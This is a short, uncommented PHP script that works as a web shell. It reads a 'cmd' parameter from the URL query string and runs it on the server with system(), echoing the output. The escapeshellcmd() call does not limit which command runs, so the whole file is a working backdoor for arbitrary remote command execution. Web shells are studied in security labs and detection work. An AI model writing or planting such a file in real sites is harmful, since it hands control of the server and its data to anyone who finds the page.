<?php
$cmd = $_GET["cmd"] ?? "id";
echo "<pre>";
system(escapeshellcmd($cmd));
echo "</pre>";
?>